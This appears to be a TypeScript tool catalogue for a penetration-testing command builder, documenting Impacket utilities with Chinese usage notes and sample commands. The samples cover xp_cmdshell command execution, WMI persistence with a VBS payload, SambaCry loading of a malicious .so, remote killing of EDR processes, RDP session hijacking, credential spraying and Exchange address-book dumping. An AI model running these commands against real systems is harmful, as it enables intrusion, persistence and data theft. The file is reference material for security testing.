import type { Tool } from '../../../types';
import { buildImpacketAuth, v } from '../../../lib/auth';

/**
 * impacket 杂项类工具 (MSSQL/WMI/ping/sniff/RDP/MQTT/SambaPipe/tstool/exchanger)
 * 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples。
 * 参考: https://github.com/fortra/impacket/tree/master/examples
 *
 * caps 差异 (逐个核对 --help):
 * - mssqlclient/sambaPipe/tstool 支持 -dc-ip/-k/-no-pass/-aesKey/-target-ip
 * - wmipersist/wmiquery 支持 -dc-ip/-k/-no-pass/-aesKey，不支持 -target-ip
 * - rdp_check/exchanger 仅支持 -hashes，无 -dc-ip/-k/-no-pass/-aesKey
 * - mqtt_check 无任何 impacket 风格认证参数 (仅 target 内嵌 user:pass)
 * - ping/ping6/sniff/sniffer 无 argparse，按源码实际用法编写
 */
export const impacketMiscTools: Tool[] = [
  {
    id: 'impacket-mssqlclient',
    name: 'impacket-mssqlclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py',
    description: 'MSSQL 客户端 (TDS 协议，支持 SSL，默认端口 1433)，可执行 SQL 查询与 xp_cmdshell 命令执行',
    commands: [
      {
        id: 'mssqlclient-connect',
        title: 'MSSQL 连接 (SQL 认证)',
        description: '默认 SQL 认证；进入交互后可用 enable_xp_cmdshell / xp_cmdshell 等内置命令',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p, { targetIp: true })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>，认证信息+目标
关键参数:
  -db DB           指定连接的 MSSQL 数据库实例
  -windows-auth    使用 Windows (NTLM/Kerberos) 认证而非 SQL 认证
  -command [CMD..] 直接在 SQL shell 中执行命令 (可传多条)，不进入交互
  -file FILE       从文件读取要执行的 SQL shell 命令
  -port PORT       目标 MSSQL 端口 (默认 1433)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时指定目标 IP
交互内置命令 (官方 examples 文档):
  enable_xp_cmdshell / disable_xp_cmdshell  开启/关闭 xp_cmdshell
  xp_cmdshell <cmd>   通过 xp_cmdshell 执行系统命令
  enum_db / enum_links / enum_impersonate / enum_logins  枚举信息
  use_link <name>     切换到链接服务器上下文；shell 直接执行系统命令`,
        example: 'impacket-mssqlclient sa:SqlPass123@192.168.1.20 -db master',
      },
      {
        id: 'mssqlclient-windows',
        title: 'MSSQL Windows 认证连接',
        description: '-windows-auth 使用 Windows 域认证，可配合 hash/Kerberos',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p, { targetIp: true })} -windows-auth`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -windows-auth  使用 Windows (NTLM/Kerberos) 认证；域用户凭据必须用此选项
  -db DB         指定数据库实例；-port PORT 指定端口 (默认 1433)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时指定目标 IP
说明: 域管理员/DbOwner 连接后可 enable_xp_cmdshell 获取命令执行`,
        example: 'impacket-mssqlclient corp.local/sqlsvc:Password123@192.168.1.20 -windows-auth',
      },
      {
        id: 'mssqlclient-command',
        title: '直接执行 SQL 命令 (非交互)',
        description: '-command 一次性执行 SQL shell 命令，适合脚本化利用',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p, { targetIp: true })} -windows-auth -command ${v(undefined, 'SQL_COMMAND')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -command [COMMAND ...]  要执行的 SQL shell 命令，可一次传多条
                          如 enable_xp_cmdshell、xp_cmdshell whoami
  -file FILE              从文件批量读取命令执行
  -windows-auth           使用 Windows 认证
说明:
  -command 执行完即退出，不进入交互 shell，适合自动化渗透脚本
认证参数: -hashes / -k -no-pass / -aesKey -k
连接参数: -dc-ip / -target-ip / -port (默认 1433)`,
        example: "impacket-mssqlclient corp.local/sqlsvc:Password123@192.168.1.20 -windows-auth -command enable_xp_cmdshell 'xp_cmdshell whoami'",
      },
    ],
  },
  {
    id: 'impacket-wmipersist',
    name: 'impacket-wmipersist',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/wmipersist.py',
    description: 'WMI 事件订阅持久化：创建/删除 Event Filter + Consumer 绑定，定时或按 WQL 触发 VBS 脚本',
    commands: [
      {
        id: 'wmipersist-install',
        title: '安装 WMI 事件订阅 (持久化)',
        description: 'install 子命令注册 EventFilter/Consumer，-timer 毫秒定时或 -filter WQL 触发执行 VBS',
        build: (p) => `impacket-wmipersist ${buildImpacketAuth(p)} install -name ${v(p.fileName, 'EVENT_NAME')} -vbs ${v(p.fileName, 'VBS_FILE')} -timer ${v(undefined, 'MILLISECONDS')}`,
        usage: `位置参数:
  target   [domain/][username[:password]@]<address>
  {install,remove}  动作子命令
install 子命令参数:
  -name NAME    事件名称 (必填)
  -vbs FILE     包含要执行代码的 VBS 文件 (必填)
  -filter WQL   触发执行的 WQL 过滤字符串 (与 -timer 二选一)
  -timer MS     启动后多少毫秒触发一次 (与 -filter 二选一)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP；-com-version MAJOR:MINOR 指定 DCOM 版本
说明: 需要管理员权限；WMI 事件订阅是经典无文件持久化手法`,
        example: 'impacket-wmipersist corp.local/administrator:Password123@192.168.1.10 install -name BackupTask -vbs payload.vbs -timer 60000',
      },
      {
        id: 'wmipersist-remove',
        title: '删除 WMI 事件订阅',
        description: 'remove 子命令按名称清理已安装的 Filter/Consumer',
        build: (p) => `impacket-wmipersist ${buildImpacketAuth(p)} remove -name ${v(p.fileName, 'EVENT_NAME')}`,
        usage: `位置参数:
  target   [domain/][username[:password]@]<address>
  {install,remove}  动作子命令
remove 子命令参数:
  -name NAME  要删除的事件名称 (必填，与 install 时一致)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP
说明: 清理痕迹时使用，删除事件 Filter、Consumer 及二者绑定`,
        example: 'impacket-wmipersist corp.local/administrator:Password123@192.168.1.10 remove -name BackupTask',
      },
    ],
  },
  {
    id: 'impacket-wmiquery',
    name: 'impacket-wmiquery',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/wmiquery.py',
    description: '通过 WMI 远程执行 WQL 查询并获取对象描述 (交互式 WQL shell)',
    commands: [
      {
        id: 'wmiquery-shell',
        title: '交互式 WQL 查询',
        description: '连接后进入 WQL shell，可执行 SELECT 等 WQL 语句',
        build: (p) => `impacket-wmiquery ${buildImpacketAuth(p)}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -namespace NS  指定 WMI 命名空间 (默认 //./root/cimv2)
  -file FILE     从文件读取要在 WQL shell 中执行的命令
  -rpc-auth-level [{integrity,privacy,default}]
                 指定 RPC 认证级别；部分命名空间 (如 root/MSCluster) 需要 privacy
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP；-com-version MAJOR:MINOR 指定 DCOM 版本
说明: 进入交互后输入 WQL 语句，如 SELECT * FROM Win32_Process`,
        example: 'impacket-wmiquery corp.local/administrator:Password123@192.168.1.10',
      },
      {
        id: 'wmiquery-namespace',
        title: '指定命名空间批量查询',
        description: '-namespace 切换命名空间，-file 批量执行 WQL 命令',
        build: (p) => `impacket-wmiquery ${buildImpacketAuth(p)} -namespace ${v(undefined, 'NAMESPACE')} -file ${v(p.fileName, 'WQL_FILE')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -namespace NS  WMI 命名空间 (默认 //./root/cimv2)，如 //./root/Microsoft/Windows/Defender
  -file FILE     包含 WQL shell 命令的输入文件，每行一条，批量执行
  -rpc-auth-level  RPC 认证级别 (default/integrity/privacy)
认证参数: -hashes / -k -no-pass / -aesKey -k
连接参数: -dc-ip 域控 IP
说明: 适合批量信息收集，如杀软识别、补丁枚举、进程列表`,
        example: 'impacket-wmiquery corp.local/administrator:Password123@192.168.1.10 -namespace //./root/SecurityCenter2 -file queries.txt',
      },
    ],
  },
  {
    id: 'impacket-ping',
    name: 'impacket-ping',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ping.py',
    description: '简单 ICMP echo ping (raw socket 实现，测试目标存活)',
    commands: [
      {
        id: 'ping-icmp',
        title: 'ICMP Ping',
        description: '用法: ping.py <src ip> <dst ip>，无 argparse 参数',
        build: (p) => `impacket-ping ${v(p.localIP, 'SRC_IP')} ${v(p.targetIP, 'DST_IP')}`,
        usage: `位置参数:
  src ip   源 IP 地址 (本机/伪造的源地址)
  dst ip   目标 IP 地址
说明:
  该脚本无 argparse 选项，仅接受两个位置参数
  使用 raw socket 构造 ICMP echo 请求，可能需要 root 权限
  可用于测试目标存活或源地址伪造场景`,
        example: 'impacket-ping 192.168.1.5 192.168.1.10',
      },
    ],
  },
  {
    id: 'impacket-ping6',
    name: 'impacket-ping6',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ping6.py',
    description: 'ICMPv6 echo ping (raw socket 实现，测试 IPv6 目标存活)',
    commands: [
      {
        id: 'ping6-icmp',
        title: 'ICMPv6 Ping',
        description: '用法: ping6.py <src ip> <dst ip>，无 argparse 参数',
        build: (p) => `impacket-ping6 ${v(p.localIP, 'SRC_IPV6')} ${v(p.targetIP, 'DST_IPV6')}`,
        usage: `位置参数:
  src ip   源 IPv6 地址
  dst ip   目标 IPv6 地址
说明:
  该脚本无 argparse 选项，仅接受两个位置参数
  使用 raw socket 构造 ICMPv6 echo 请求，可能需要 root 权限
  IPv6 网络 (如内网链路本地地址) 存活探测时使用`,
        example: 'impacket-ping6 fe80::1 fe80::2',
      },
    ],
  },
  {
    id: 'impacket-rdp_check',
    name: 'impacket-rdp_check',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/rdp_check.py',
    description: '通过 RDP 协议验证账号在目标主机上是否有效 (仅支持密码/hash 认证)',
    commands: [
      {
        id: 'rdp_check-creds',
        title: 'RDP 凭据验证',
        description: '测试目标 RDP 服务上的凭据有效性，仅支持 -hashes，无 Kerberos/-dc-ip',
        build: (p) => `impacket-rdp_check ${buildImpacketAuth(p, { dcIp: false, kerberos: false, aesKey: false })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
认证参数:
  -hashes LMHASH:NTHASH  NTLM hash 认证 (Pass-the-Hash 验证)
说明:
  该工具不支持 -k/-no-pass/-aesKey/-dc-ip，仅密码或 hash
  通过发起 RDP 握手判断凭据是否有效，不产生完整登录会话
关键参数:
  -6 / --ipv6  使用 IPv6 连接
  -ts 日志加时间戳；-debug 调试输出
用途: 批量喷洒/验证凭据、确认 NTLM hash 是否仍然有效`,
        example: 'impacket-rdp_check corp.local/administrator:Password123@192.168.1.10',
      },
    ],
  },
  {
    id: 'impacket-mqtt_check',
    name: 'impacket-mqtt_check',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/mqtt_check.py',
    description: 'MQTT 登录检查 (默认端口 1883)，测试 MQTT broker 凭据',
    commands: [
      {
        id: 'mqtt_check-login',
        title: 'MQTT 登录测试',
        description: '无任何 impacket 风格认证参数，凭据内嵌在 target 中',
        build: (p) => `impacket-mqtt_check ${buildImpacketAuth(p, { dcIp: false, kerberos: false, aesKey: false })}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName>，凭据+目标主机
关键参数:
  -client-id ID  认证时使用的 Client ID (默认随机生成)
  -ssl           启用 SSL/TLS 连接
  -port PORT     连接端口 (默认 1883，SSL 通常为 8883)
说明:
  该工具不支持 -hashes/-k/-aesKey/-dc-ip，仅明文用户名密码
  用于测试 MQTT broker 是否允许该凭据登录 (IoT/内网常见)`,
        example: 'impacket-mqtt_check admin:mqttpass@192.168.1.30 -ssl -port 8883',
      },
    ],
  },
  {
    id: 'impacket-sniff',
    name: 'impacket-sniff',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/sniff.py',
    description: '简单报文嗅探 (基于 pcapy，交互选择网卡，支持 BPF 过滤器)',
    commands: [
      {
        id: 'sniff-start',
        title: '启动嗅探',
        description: '无 argparse；启动后交互输入网卡序号，命令行参数整体作为 BPF 过滤器',
        build: () => 'impacket-sniff',
        usage: `用法:
  sniff.py [BPF 过滤器]
说明:
  该脚本无标准 argparse，运行后列出所有网卡并提示输入序号选择
  命令行上传入的所有参数会被拼接为 BPF 过滤器 (语法见 tcpdump(3))
  例如: impacket-sniff tcp port 445  只捕获 SMB 流量
  该功能官方已标记将在下个 Impacket 版本弃用
  需要 root 权限打开抓包接口`,
        example: 'impacket-sniff tcp port 445',
      },
    ],
  },
  {
    id: 'impacket-sniffer',
    name: 'impacket-sniffer',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/sniffer.py',
    description: '基于 raw socket 的简单报文嗅探，按协议监听并解码打印',
    commands: [
      {
        id: 'sniffer-start',
        title: '按协议嗅探',
        description: '无 argparse；位置参数为协议名列表，默认 icmp/tcp/udp',
        build: () => 'impacket-sniffer',
        usage: `用法:
  sniffer.py [proto1] [proto2] ...
说明:
  该脚本无标准 argparse；不带参数时默认监听 icmp、tcp、udp
  可在命令行指定协议名 (如 icmp udp)，未知协议会被忽略
  为每个协议打开一个 raw socket (IP_HDRINCL)，解码后打印报文
  需要 root/CAP_NET_RAW 权限`,
        example: 'impacket-sniffer icmp udp',
      },
    ],
  },
  {
    id: 'impacket-sambaPipe',
    name: 'impacket-sambaPipe',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/sambaPipe.py',
    description: 'Samba named pipe 利用：上传并通过 pipe 加载恶意 .so (SambaCry 类)',
    commands: [
      {
        id: 'sambapipe-exploit',
        title: '上传并加载恶意 .so',
        description: '-so 指定要上传加载的共享对象文件 (必填)',
        build: (p) => `impacket-sambaPipe ${buildImpacketAuth(p, { targetIp: true })} -so ${v(p.fileName, 'SO_FILE')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
关键参数:
  -so SO   要上传并通过 named pipe 加载的 .so 文件 (必填)
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时指定目标 IP
          -port [port] 连接 SMB 服务的目标端口
说明:
  针对存在 pipe 加载漏洞的 Samba 服务 (如 CVE-2017-7494 SambaCry)
  .so 需自行编译，导出 samba_init_module 并包含 payload`,
        example: 'impacket-sambaPipe user:Password123@192.168.1.40 -so evil.so',
      },
    ],
  },
  {
    id: 'impacket-tstool',
    name: 'impacket-tstool',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/tstool.py',
    description: 'Terminal Services (远程桌面服务) 管理工具：会话枚举/进程管理/会话劫持/远程关机',
    commands: [
      {
        id: 'tstool-qwinsta',
        title: '枚举 RDP 会话 (qwinsta)',
        description: '列出目标上的远程桌面服务会话 (会话 ID/用户/状态)',
        build: (p) => `impacket-tstool ${buildImpacketAuth(p, { targetIp: true })} qwinsta`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
  子命令   qwinsta/tasklist/taskkill/tscon/tsdiscon/logoff/shutdown/msg/shadow
qwinsta 子命令:
  显示远程桌面服务会话信息，-v 输出详细信息
认证参数: -hashes LMHASH:NTHASH / -k -no-pass / -aesKey <hex> -k
连接参数: -dc-ip 域控 IP；-target-ip 目标主机名无法解析时指定目标 IP
          -port [139|445] 连接 SMB 服务的端口 (默认 445)
说明: 先 qwinsta 拿到 SessionID，再配合 tscon/logoff/shadow 等子命令`,
        example: 'impacket-tstool corp.local/administrator:Password123@192.168.1.10 qwinsta',
      },
      {
        id: 'tstool-taskkill',
        title: '结束远程进程 (taskkill)',
        description: 'taskkill 按 PID 或映像名结束进程；tasklist 可先枚举进程',
        build: (p) => `impacket-tstool ${buildImpacketAuth(p, { targetIp: true })} taskkill -pid ${v(undefined, 'PID')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
tasklist 子命令: 列出当前运行的进程 (-v 详细输出)
taskkill 子命令:
  -pid PID    按进程 ID 结束任务
  -name NAME  按映像名结束任务 (内部会解析为 PID)
认证参数: -hashes / -k -no-pass / -aesKey -k
连接参数: -dc-ip / -target-ip / -port [139|445] (默认 445)
说明: 可远程结束杀软/EDR 进程或释放被锁定的资源`,
        example: 'impacket-tstool corp.local/administrator:Password123@192.168.1.10 taskkill -pid 1234',
      },
      {
        id: 'tstool-session',
        title: '会话操作 (logoff/tscon/shadow)',
        description: 'logoff 注销会话；tscon 会话劫持到当前桌面；shadow 监视/控制会话',
        build: (p) => `impacket-tstool ${buildImpacketAuth(p, { targetIp: true })} logoff -session ${v(undefined, 'SESSION_ID')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
常用会话子命令:
  logoff -session ID       注销指定会话
  tsdiscon -session ID     断开会话
  tscon -source ID -dest ID [-password PWD]  将源会话接入目标桌面 (会话劫持)
  shadow -session ID [-control] [-prompt]    监视/控制会话 (-control 请求控制权)
  msg -session ID -message MSG [-title T]    向会话弹消息框
  shutdown -logoff/-shutdown/-reboot/-poweroff  远程关机 (影响所有会话!)
认证参数: -hashes / -k -no-pass / -aesKey -k
连接参数: -dc-ip / -target-ip / -port [139|445] (默认 445)`,
        example: 'impacket-tstool corp.local/administrator:Password123@192.168.1.10 logoff -session 2',
      },
    ],
  },
  {
    id: 'impacket-exchanger',
    name: 'impacket-exchanger',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/exchanger.py',
    description: 'Exchange 服务滥用工具：通过 NSPI (RPC/HTTP) 枚举/导出通讯簿与 AD 对象 (仅支持密码/hash)',
    commands: [
      {
        id: 'exchanger-list-tables',
        title: '列出通讯簿 (nspi list-tables)',
        description: '通过 NSPI 接口列出 Exchange 通讯簿 (Address Books)',
        build: (p) => `impacket-exchanger ${buildImpacketAuth(p, { dcIp: false, kerberos: false, aesKey: false })} nspi list-tables`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>，目标为 Exchange 服务器
  模块     目前仅 nspi (攻击 NSPI 接口)
nspi 子模块:
  list-tables   列出通讯簿，-count 同时请求各表记录总数
  dump-tables   导出通讯簿内容
  guid-known    按 GUID 查询 AD 对象
  dnt-lookup    按 DNT (Distinguished Name Tag) 范围查询
认证参数: 仅 -hashes LMHASH:NTHASH；不支持 -k/-no-pass/-aesKey/-dc-ip
关键参数:
  -rpc-hostname NAME  Exchange 服务器名 (GUID 格式优先，或 NetBIOS 名)`,
        example: 'impacket-exchanger corp.local/jdoe:Password123@192.168.1.50 nspi list-tables -count',
      },
      {
        id: 'exchanger-dump-tables',
        title: '导出通讯簿 (nspi dump-tables)',
        description: 'dump-tables 导出 GAL 等通讯簿内容，可导出全部域用户邮箱/属性',
        build: (p) => `impacket-exchanger ${buildImpacketAuth(p, { dcIp: false, kerberos: false, aesKey: false })} nspi dump-tables -name ${v(undefined, 'TABLE_NAME')} -output-file ${v(p.fileName, 'OUTPUT_FILE')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
nspi dump-tables 参数:
  -name NAME             按名称导出指定表 (含 GAL 全局通讯录)
  -guid GUID             按 GUID 导出指定表
  -lookup-type [TYPE]    MINIMAL(默认)/EXTENDED/FULL/GUIDS 字段详细程度
  -rows-per-request N    限制每次请求的行数 (默认 50)
  -output-type [FMT]     二进制对象输出格式 hex(默认)/base64
  -output-file FILE      导出结果写入文件
认证参数: 仅 -hashes LMHASH:NTHASH
说明: 普通域用户即可导出 GAL，用于收集全域名簿/邮箱/电话等信息`,
        example: 'impacket-exchanger corp.local/jdoe:Password123@192.168.1.50 nspi dump-tables -name GAL -lookup-type FULL -output-file gal.txt',
      },
      {
        id: 'exchanger-dnt-lookup',
        title: 'DNT 范围枚举 (nspi dnt-lookup)',
        description: 'dnt-lookup 按 DNT 范围遍历对象，无需知道表名即可枚举全部对象',
        build: (p) => `impacket-exchanger ${buildImpacketAuth(p, { dcIp: false, kerberos: false, aesKey: false })} nspi dnt-lookup -start-dnt ${v(undefined, 'START_DNT')} -stop-dnt ${v(undefined, 'STOP_DNT')} -output-file ${v(p.fileName, 'OUTPUT_FILE')}`,
        usage: `位置参数:
  target   [[domain/]username[:password]@]<targetName or address>
nspi dnt-lookup 参数:
  -start-dnt N        起始 DNT (默认 500000)
  -stop-dnt N         结束 DNT (默认 0)
  -lookup-type [TYPE] EXTENDED(默认)/FULL/GUIDS
  -rows-per-request N 每次请求行数 (默认 350)
  -output-type [FMT]  hex(默认)/base64
  -output-file FILE   结果写入文件
认证参数: 仅 -hashes LMHASH:NTHASH
说明: 通过递增 DNT 枚举 NSPI 全部对象，可批量导出 AD 用户/组信息`,
        example: 'impacket-exchanger corp.local/jdoe:Password123@192.168.1.50 nspi dnt-lookup -start-dnt 500000 -stop-dnt 0 -output-file objects.txt',
      },
    ],
  },
];
